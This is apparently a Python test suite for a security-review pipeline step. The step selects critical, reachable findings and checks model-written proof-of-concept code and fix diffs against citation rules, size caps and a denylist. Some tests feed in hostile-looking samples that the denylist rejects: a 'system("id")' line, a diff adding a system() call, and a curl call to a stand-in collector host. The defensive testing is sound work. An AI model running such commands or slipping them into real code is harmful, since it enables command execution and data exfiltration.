"""Lane 12b: eligibility (verified + CRITICAL + REACHABLE), request workspaces, the derive step
(citations, caps, fix files, denylist) and the pool merge into per-finding records. Fake persona
replies only: no model, no pool, no container."""
from __future__ import annotations

import copy
import json
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import poc_fix_derive as derive
import poc_fix_pool as pool
import poc_fix_select as select
from claude_cli_invoker import InvokerOutputError
from review_control_loops import deterministic_merge
from schema_validate import validate_document
from tests.test_report_finding_enrichment import SHA, write_run

AUTHOR = {"job_id": "12b-poc-and-fix", "attempt_id": "c1", "persona_id": "poc-fix-author", "request_sha256": None}
REACH, ORPHAN, HIGH, OPEN = ("claim-reach", "claim-orphan", "claim-high", "claim-open")


def priority(claim_id: str, *, line: int, severity="CRITICAL", status="VERIFIED", score=9.0, sha=SHA) -> dict:
    locator = json.dumps({"path": "app/main.cpp", "start_line": line, "source_sha256": sha, "tool_id": "flawfinder",
                          "rule_id": "strcpy"}, sort_keys=True, separators=(",", ":"))
    citation = {"citation_id": f"citation-{claim_id}", "producer_job_id": "02-native-sast", "producer_attempt_id": "n1",
                "artifact_path": "native-sast.json", "artifact_sha256": "sha256:" + "5" * 64,
                "locator_json": locator, "observed_fact": f"flawfinder strcpy at app/main.cpp:{line}"}
    return {"claim_id": claim_id, "hypothesis": f"Unbounded strcpy at app/main.cpp:{line}", "component_ids": ["app"],
            "severity": severity, "score": score, "verification_status": status, "citations": [citation],
            "verification_citations": []}


def scoring(*rows: dict) -> dict:
    return {"schema": "appsec-review/scoring-prioritization/1.0", "run_id": "r1",
            "ledger_head_sha256": "sha256:" + "7" * 64, "priorities": list(rows)}


def good_reply(**changes) -> dict:
    reply = {"poc": {"kind": "call", "language": "c",
                     "text": "char big[64];\nmemset(big, 'A', sizeof big - 1);\nbig[63] = '\\0';\nhelper(big);",
                     "expected_effect": "overflow",
                     "trigger_condition": "argv[1] longer than 15 bytes reaches helper()."},
             "no_poc_reason": None,
             "explanation": "main() passes argv[1] to helper(); helper() copies it with strcpy into a 16-byte stack "
                            "buffer at line 9 without a length check, so a longer argument overflows it.",
             "cited_lines": [{"path": "app/main.cpp", "start_line": 4, "end_line": 4, "role": "source"},
                             {"path": "app/main.cpp", "start_line": 9, "end_line": 9, "role": "sink"}],
             "fix": {"diff": "--- a/app/main.cpp\n+++ b/app/main.cpp\n@@ -9 +9,2 @@\n-    std::strcpy(buffer, s);\n"
                             "+    std::strncpy(buffer, s, sizeof buffer - 1);\n+    buffer[sizeof buffer - 1] = '\\0';\n",
                     "rationale": "Bound the copy to the destination size and terminate it."}}
    reply.update(changes)
    return reply


class Run(unittest.TestCase):
    def setUp(self):
        self.folder = tempfile.TemporaryDirectory()
        self.root = Path(self.folder.name)
        write_run(self.root)

    def tearDown(self):
        self.folder.cleanup()

    def selected(self, *rows, findings_max=12):
        return select.select(scoring(*rows), self.root, findings_max=findings_max, window=20)


class EligibilityTests(Run):
    def test_only_verified_critical_reachable_findings_get_a_request(self):
        result = self.selected(priority(REACH, line=9), priority(ORPHAN, line=13),
                               priority(HIGH, line=9, severity="HIGH"), priority(OPEN, line=9, status="BLOCKED"))
        self.assertEqual([doc["claim_id"] for doc in result["requests"]], [REACH])
        self.assertEqual({row["claim_id"]: row["reason"] for row in result["excluded"]},
                         {ORPHAN: "not-reachable", HIGH: "not-critical", OPEN: "not-verified"})
        self.assertEqual([gap["id"] for gap in result["gaps"] if gap["reason"] == "not-reachable"], [ORPHAN])
        self.assertEqual((result["considered"], result["eligible"]), (4, 1))

    def test_workspace_pins_hashes_windows_witness_and_snippets(self):
        document = self.selected(priority(REACH, line=9))["requests"][0]
        self.assertEqual(validate_document(document, derive.WORKSPACE_SCHEMA), [])
        self.assertRegex(document["request_id"], r"^pocreq-[0-9a-f]{16}$")
        self.assertEqual(document["citable"], [{"path": "app/main.cpp", "source_sha256": SHA,
                                                "hash_basis": "finding-citation", "windows": [{"start": 1, "end": 29}]}])
        self.assertEqual([step["function"] for step in document["reachability"]["witness"]][:2], ["main", "helper"])
        self.assertEqual(document["snippets"][0]["path"], "app/main.cpp")
        self.assertIn("    std::strcpy(buffer, s);", document["snippets"][0]["source"])

    def test_cap_and_unpinnable_hash_are_gaps(self):
        result = self.selected(priority(REACH, line=9, score=9.5), priority("claim-reach-2", line=9, score=9.0),
                               findings_max=1)
        self.assertEqual([doc["claim_id"] for doc in result["requests"]], [REACH])
        self.assertIn(("claim-reach-2", "cap"), {(gap["id"], gap["reason"]) for gap in result["gaps"]})
        stale = self.selected(priority(REACH, line=9, sha="sha256:" + "e" * 64))
        self.assertEqual(stale["requests"], [])
        self.assertEqual(stale["excluded"][0]["reason"], "no-citable-source")
        self.assertIn("citation-unpinned", {gap["reason"] for gap in stale["gaps"]})


class DeriveTests(Run):
    def setUp(self):
        super().setUp()
        self.workspace = self.selected(priority(REACH, line=9))["requests"][0]

    def test_benign_overflow_poc_is_accepted_and_labelled_unvalidated(self):
        record, _notes = derive.derive(self.workspace, good_reply(), author=AUTHOR)
        self.assertEqual(validate_document(record, derive.RECORD_SCHEMA), [])
        self.assertEqual((record["label"], record["poc"]["status"], record["fix"]["status"]),
                         ("UNVALIDATED", "PROPOSED_UNVALIDATED", "PATCH_PROPOSED_UNVALIDATED"))
        self.assertEqual({row["source_sha256"] for row in record["cited_lines"]}, {SHA})
        self.assertEqual(record["fix"]["files"], ["app/main.cpp"])
        self.assertFalse(any(record["claim_limits"].values()))
        self.assertEqual(derive.recheck(record, self.workspace), [])

    def test_citation_outside_the_workspace_is_sent_back_for_repair(self):
        for cited, message in (
                ({"path": "app/other.cpp", "start_line": 9, "end_line": 9, "role": "sink"}, "not a citable"),
                ({"path": "app/main.cpp", "start_line": 60, "end_line": 61, "role": "sink"}, "outside the citable"),
                ({"path": "app/main.cpp", "start_line": 9, "end_line": 8, "role": "sink"}, "before start_line")):
            with self.subTest(cited=cited), self.assertRaises(InvokerOutputError) as caught:
                derive.derive(self.workspace, good_reply(cited_lines=[cited]), author=AUTHOR)
            self.assertIn(message, " ".join(caught.exception.details))
        with self.assertRaises(InvokerOutputError) as caught:
            derive.derive(self.workspace, good_reply(cited_lines=[
                {"path": "app/main.cpp", "start_line": 2, "end_line": 4, "role": "source"}]), author=AUTHOR)
        self.assertIn("covers a finding location", " ".join(caught.exception.details))

    def test_model_supplied_hash_or_id_never_reaches_the_record(self):
        reply = good_reply()
        reply["cited_lines"][1]["source_sha256"] = "sha256:" + "f" * 64
        reply["poc_fix_id"] = "pocfix-" + "0" * 24
        record, notes = derive.derive(self.workspace, reply, author=AUTHOR)
        self.assertEqual({row["source_sha256"] for row in record["cited_lines"]}, {SHA})
        self.assertNotEqual(record["poc_fix_id"], "pocfix-" + "0" * 24)
        self.assertTrue(any("source_sha256" in note for note in notes))

    def test_fix_touching_another_file_or_without_hunk_is_repaired(self):
        other = good_reply(fix={"diff": "--- a/etc/config\n+++ b/etc/config\n@@ -1 +1 @@\n-a\n+b\n", "rationale": "x"})
        with self.assertRaises(InvokerOutputError) as caught:
            derive.derive(self.workspace, other, author=AUTHOR)
        self.assertIn("not a citable workspace file", " ".join(caught.exception.details))
        with self.assertRaises(InvokerOutputError):
            derive.derive(self.workspace, good_reply(fix={"diff": "use strncpy", "rationale": "x"}), author=AUTHOR)

    def test_size_caps_are_enforced(self):
        long_poc = good_reply()
        long_poc["poc"]["text"] = "\n".join(["helper(big);"] * 41)
        with self.assertRaises(InvokerOutputError) as caught:
            derive.derive(self.workspace, long_poc, author=AUTHOR)
        self.assertIn("at most 40 lines", " ".join(caught.exception.details))
        too_big = good_reply()
        too_big["poc"]["text"] = "A" * 2401
        with self.assertRaises(InvokerOutputError):
            derive.derive(self.workspace, too_big, author=AUTHOR)

    def test_denylisted_poc_is_withheld_not_repaired(self):
        hostile = good_reply()
        hostile["poc"]["text"] = 'helper(big);\nsystem("id");'
        record, _ = derive.derive(self.workspace, hostile, author=AUTHOR)
        self.assertEqual(record["poc"]["status"], "REJECTED_DENYLIST")
        self.assertIsNone(record["poc"]["text"])
        self.assertEqual(record["poc"]["denylist_hits"], [{"rule": "process-spawn", "field": "poc.text", "line": 2}])
        self.assertEqual(record["fix"]["status"], "PATCH_PROPOSED_UNVALIDATED")
        self.assertEqual(derive.rejected_parts(record), ["PoC text withheld by the denylist (process-spawn)"])
        self.assertEqual(derive.recheck(record, self.workspace), [])

    def test_denylisted_fix_addition_is_withheld(self):
        reply = good_reply(fix={"diff": "--- a/app/main.cpp\n+++ b/app/main.cpp\n@@ -9 +9 @@\n-    std::strcpy(buffer, s);\n"
                                        "+    if (strlen(s) > 15) system(\"logger overflow\");\n",
                                "rationale": "Log and continue."})
        record, _ = derive.derive(self.workspace, reply, author=AUTHOR)
        self.assertEqual((record["fix"]["status"], record["fix"]["diff"]), ("REJECTED_DENYLIST", None))
        self.assertEqual(record["poc"]["status"], "PROPOSED_UNVALIDATED")

    def test_no_poc_needs_a_reason(self):
        with self.assertRaises(InvokerOutputError):
            derive.derive(self.workspace, good_reply(poc=None), author=AUTHOR)
        record, _ = derive.derive(self.workspace, good_reply(poc=None, no_poc_reason="input is bounded upstream"),
                                  author=AUTHOR)
        self.assertEqual((record["poc"]["status"], record["poc"]["reason"]), ("NOT_PROVIDED", "input is bounded upstream"))


class CollectTests(Run):
    def setUp(self):
        super().setUp()
        self.workspace = self.selected(priority(REACH, line=9))["requests"][0]

    def merge(self, record):
        document = derive.candidates(record, "sha256:" + "a" * 64)
        return deterministic_merge("r1", [{"worker_id": "w0", "producer_id": "poc-fix-author", "run_id": "r1"}],
                                   [{"worker_id": "w0", "producer_id": "poc-fix-author", "run_id": "r1", "status": "OK",
                                     "candidates": document["candidates"]}])

    def test_record_is_merged_per_finding(self):
        record, _ = derive.derive(self.workspace, good_reply(), author=AUTHOR)
        records, gaps, coverage = pool.collect([self.workspace], self.merge(record))
        self.assertEqual(records, [record])
        self.assertEqual(gaps, [])
        self.assertEqual(coverage["poc_proposed"], 1)

    def test_failed_cell_and_tampered_record_are_gaps(self):
        empty = deterministic_merge("r1", [{"worker_id": "w0", "producer_id": "poc-fix-author", "run_id": "r1"}], [])
        records, gaps, _ = pool.collect([self.workspace], empty)
        self.assertEqual((records, [gap["reason"] for gap in gaps]), ([], ["author-failed"]))
        record, _ = derive.derive(self.workspace, good_reply(), author=AUTHOR)
        tampered = copy.deepcopy(record)
        tampered["cited_lines"][0]["source_sha256"] = "sha256:" + "f" * 64
        records, gaps, _ = pool.collect([self.workspace], self.merge(tampered))
        self.assertEqual(records, [])
        self.assertEqual([gap["reason"] for gap in gaps], ["record-mismatch"])

    def test_denylist_rejection_is_a_gap(self):
        hostile = good_reply()
        hostile["poc"]["text"] = "curl http://collector.invalid/x"
        record, _ = derive.derive(self.workspace, hostile, author=AUTHOR)
        _records, gaps, coverage = pool.collect([self.workspace], self.merge(record))
        self.assertEqual([(gap["reason"], gap["id"]) for gap in gaps], [("denylist-rejected", REACH)])
        self.assertEqual(coverage["poc_rejected"], 1)


if __name__ == "__main__":
    unittest.main()
